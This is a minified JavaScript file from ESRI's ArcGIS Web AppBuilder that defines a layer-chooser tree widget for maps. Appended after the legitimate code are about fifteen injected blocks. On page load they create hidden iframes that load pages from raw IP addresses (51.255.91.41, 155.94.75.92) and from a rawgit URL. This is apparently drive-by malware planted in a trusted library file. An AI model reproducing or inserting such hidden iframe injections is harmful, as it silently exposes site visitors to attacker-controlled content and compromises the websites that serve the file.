// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/on dojo/_base/declare dojo/promise/all dojo/_base/lang dojo/_base/html dojo/_base/array jimu/dijit/CheckBox jimu/dijit/LayerChooserFromMap jimu/LayerStructure".split(" "),function(n,k,p,g,e,m,t,q,r){var f=k([q],{templateString:'\x3cdiv style\x3d"width:100%;"\x3e\x3cdiv data-dojo-attach-point\x3d"errorTipSection" class\x3d"error-tip-section"\x3e\x3cspan class\x3d"jimu-icon jimu-icon-error"\x3e\x3c/span\x3e\x3cspan class\x3d"jimu-state-error-text" data-dojo-attach-point\x3d"errTip"\x3e${nls.noLayersTip}\x3c/span\x3e\x3c/div\x3e\x3cdiv data-dojo-attach-point\x3d"treeSection" class\x3d"tree-section"\x3e\x3cul data-dojo-attach-point\x3d"treeUl" class\x3d"tree-ul tree-root-ul"\x3e\x3c/ul\x3e\x3c/div\x3e\x3c/div\x3e',
map:null,layerStateController:null,layerState:null,customFilter:null,onlySelectLeafLayer:!1,displayLayerTypeIcon:!0,showTables:!0,layerStructure:null,_layerDatas:null,_eventHandles:null,postMixInProperties:function(){this.nls=window.jimuNls.basicLayerChooserFromMap},postCreate:function(){e.addClass(this.domNode,"jimu-basic-layer-chooser-from-map");e.addClass(this.domNode,"jimu-basic-layer-chooser-from-map-lite");this._layerDatas={};this._eventHandles=[];this.layerStructure=this.map?r.createInstance(this.map):
r.getInstance();this.layerInfosObj=this.layerStructure._layerInfos;this.layerState=this._clearLayerState(this.layerState)||{};this.layerStateController||(this.layerStateController=new f.LayerStateController);var a;a=this.customFilter?g.hitch(this,this.customFilter):g.hitch(this,this.filter);this.filter=q.andCombineFilters([this.basicFilter,a]);this._createTree()},_createTree:function(){var a=this.layerStructure.getLayerNodes(),b=this.layerStructure.getTableNodes();0<this._createLayerNodes(a.concat(this.showTables?
b:[]),this.treeUl)&&(e.setStyle(this.errorTipSection,"display","none"),this.layerStateController.restoreState(this.layerState,this.layerStructure))},_createLayerNodes:function(a,b){var c=m.map(a,function(a){return this.filter(a._layerInfo)},this),d=0;p(c).then(g.hitch(this,function(c){m.forEach(c,function(c,e){c&&(this._createLayerNode(a[e],b),d++)},this)}));return d},_createLayerNode:function(a,b){var c=e.create("li",{"class":"tree-node-li",id:"layerchooserlite-tree-node-li-"+a.id},b),d=e.create("div",
{"class":"tree-node-div"},c);b=e.create("span",{"class":"tree-node-column-span collapse-span"},d);var f=e.create("span",{"class":"tree-node-column-span check-box-span"},d),l=e.create("div",{"class":"tree-node-column-div check-box-div"},f),f=e.create("span",{"class":"tree-node-column-span icon-span "+(this.displayLayerTypeIcon?"display":"")},d),h;h=(h=this.layerState[a.id])?h.selected:this.layerStateController.getState(a);l=new t({checked:h},l);h=e.create("span",{"class":"tree-node-column-span title-span",
innerHTML:a.title},d);var k=e.create("ul",{"class":"tree-ul tree-subnode-ul",style:"display:none; "},c),c={layerNode:a,layerNodeLi:c,layerNodeDiv:d,collapseSpan:b,iconSpan:f,checkBox:l,subLayerNodeUl:k,hasBeenOpened:!1};this._layerDatas[a.id]=c;a.isLeaf()||(e.addClass(b,"is-leaf"),e.addClass(h,"is-leaf"),a=n(b,"click",g.hitch(this,this._onCollapse,c)),this._eventHandles.push(a),a=n(h,"click",g.hitch(this,this._onCollapse,c)),this._eventHandles.push(a),this.onlySelectLeafLayer&&l.setStatus(!1));a=
n(l.domNode,"click",g.hitch(this,this._onCheckBoxChange,c));this._eventHandles.push(a);this._setIconImage(c,!1);return c},_setIconImage:function(a,b){if(this.displayLayerTypeIcon){var c=a.layerNode,d=c.getLayerType(),f=c.getLayerObject();p({layerType:d,layerObject:f}).then(g.hitch(this,function(d){var f;d.layerType&&d.layerObject&&(f={type:d.layerType,layerInfo:c._layerInfo},d=window.location.protocol+"//"+window.location.host+require.toUrl("jimu"),(f=this._getIconImageName(f,b))&&e.setStyle(a.iconSpan,
"background-image","url("+d+"/css/images/"+f+")"))}))}},_getCheckBoxValue:function(a){return a.getStatus()?a.getValue():!1},_clearLayerState:function(a){var b={};a&&this.layerStructure.traversal(g.hitch(this,function(c){a[c.id]&&(b[c.id]={selected:a[c.id].selected})}));return b},_selectOrDeselectLayer:function(a,b){if(a=this._layerDatas[a])a.checkBox.setValue(b),this._onCheckBoxChange(a)},selectLayer:function(a){this._selectOrDeselectLayer(a,!0)},deselectLayer:function(a){this._selectOrDeselectLayer(a,
!1)},getState:function(){var a=g.clone(this.layerState),b;for(b in this._layerDatas)this._layerDatas.hasOwnProperty(b)&&"function"!==typeof this._layerDatas[b]&&(this._getCheckBoxValue(this._layerDatas[b].checkBox)?a[b]={selected:!0}:a[b]={selected:!1});return a},restoreState:function(a){this.layerState=a;for(var b in a)if(a.hasOwnProperty(b)&&"function"!==typeof a[b]){var c=this._layerDatas[b],c=c&&c.checkBox,d=a[b];c&&c.setValue(d.selected)}this.layerStateController.restoreState(a,this.layerStructure)},
getSelectedLayerNodes:function(){var a=[],b=this.getState(),c;for(c in b)if(b.hasOwnProperty(c)&&"function"!==typeof b[c]&&b[c].selected){var d=this.layerStructure.getNodeById(c);d&&a.push(d)}return a},getLoadedLayerNodes:function(){var a=[],b;for(b in this._layerDatas)if(this._layerDatas.hasOwnProperty(b)&&"function"!==typeof this._layerDatas[b]){var c=this.layerStructure.getNodeById(b);c&&a.push(c)}return a},getLayerAssociateDomNodesById:function(a){var b=null;(a=this._layerDatas[a])&&(b={collapseIcon:a.collapseSpan,
checkBox:a.checkBox.domNode,layerTypeIcon:a.iconSpan});return b},getSelectedItems:function(){var a=[];return a=m.map(this.getSelectedLayerNodes(),function(a){return{name:a.title,url:a.getUrl(),layerInfo:a._layerInfo}},this)},getAllItems:function(){return[]},_clear:function(){this._layerDatas={};m.forEach(this._eventHandles,function(a){a.remove()},this);this._eventHandles=[];e.empty(this.treeUl)},destroy:function(){this._clear();this.map&&this.layerStructure.destroy();this.shelter&&(this.shelter.destroy(),
this.shelter=null);this.inherited(arguments)},_onCollapse:function(a){var b="none"===e.getStyle(a.subLayerNodeUl,"display")?!0:!1;b?(e.setStyle(a.subLayerNodeUl,"display","block"),e.addClass(a.collapseSpan,"opened")):(e.setStyle(a.subLayerNodeUl,"display","none"),e.removeClass(a.collapseSpan,"opened"));this._setIconImage(a,b);a.hasBeenOpened||(this._createLayerNodes(a.layerNode.getSubNodes(),a.subLayerNodeUl),a.hasBeenOpened=!0)},_onCheckBoxChange:function(a,b){this.layerStateController.setState(a.layerNode,
this._getCheckBoxValue(a.checkBox));this.emit("selection-change",a.layerNode,this._getCheckBoxValue(a.checkBox));this._onTreeClick(a,b)},_onLayerInfosChanged:function(){this._createTree();this.emit("update")},_onLayerInfosIsShowInMapChanged:function(){this._createTree();this.emit("update")},_onTreeClick:function(a,b){a={name:a.layerNode.title||"",parent:null,layerInfo:a.layerNode._layerInfo,type:null,layerClass:null,id:null,isLeaf:a.layerNode.isLeaf(),hasChildren:a.layerNode.isLeaf()?!1:!0};this.emit("tree-click",
a,null,b)}});f.LayerStateController=k(null,{getState:function(a){return!0},setState:function(a,b){return this},restoreState:function(a,b){return this}});f.LayerVisibilityStateController=k(f.LayerStateController,{getState:function(a){return a.isToggledOn()},setState:function(a,b){a.toggle();return this},restoreState:function(a,b){var c={layerOptions:{}},d;for(d in a)a.hasOwnProperty(d)&&"function"!==typeof a[d]&&(c.layerOptions[d]={visible:a[d].selected});b.restoreState(c);return this}});f.layerVisibilityStateController=
new f.LayerVisibilityStateController;f.LayerLegendStateController=k(f.LayerStateController,{getState:function(a){return a.isToggledOnLegendFromWebMap()}});f.layerLegendStateController=new f.LayerLegendStateController;return f});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});